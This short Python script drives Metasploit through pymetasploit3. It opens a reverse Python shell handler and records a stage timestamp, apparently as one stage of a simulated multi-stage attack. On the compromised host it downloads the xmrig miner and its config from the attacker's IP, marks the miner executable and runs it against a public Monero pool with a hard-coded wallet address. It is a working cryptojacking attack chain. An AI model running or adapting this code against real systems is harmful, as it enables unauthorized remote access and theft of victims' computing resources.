import time
import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient


def record_timestamp(folder, output_time_file):
    output_time_file = os.path.join(folder, output_time_file)
    with open(output_time_file, "w+") as fw:
        fw.write('%f' % time.time())


def main(argv):
    if len(argv) != 4:
        print("Usage: {} Folder local_ip target_ip".format(argv[0]))

    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]

    client = MsfRpcClient('kali')

    exploit = client.modules.use('exploit', 'multi/handler')
    payload = client.modules.use('payload', 'cmd/unix/reverse_python')
    payload['LHOST'] = my_ip

    time.sleep(2)
    output_time_file = 'time_stage_3_start.txt'
    record_timestamp(folder, output_time_file)
    time.sleep(2)

    exploit.execute(payload=payload)

    while client.jobs.list:
        time.sleep(1)

    # print(client.sessions.list['3'])

    shell = client.sessions.session('3')
    shell.write('wget --no-check-certificate http://{0}/downloads/xmrig'.format(my_ip))
    shell.write('wget --no-check-certificate http://{0}/downloads/config.json'.format(my_ip))
    shell.write('wget --no-check-certificate http://{0}/downloads/SHA256SUMS'.format(my_ip))
    shell.write('chmod +x ./xmrig')
    shell.write(
        'timeout 60s ./xmrig --donate-level 4 -o pool.minexmr.com:443 -u 44Hp1de8CprPz2K74U5ch4VssxZQUDjVrZWtgRScHZo83mb6D6cHfpLZg4zhaT1BvzJe5jdbPLHzqHp4jrx1hP6UHFCgWhN -k --tls')


main(sys.argv)
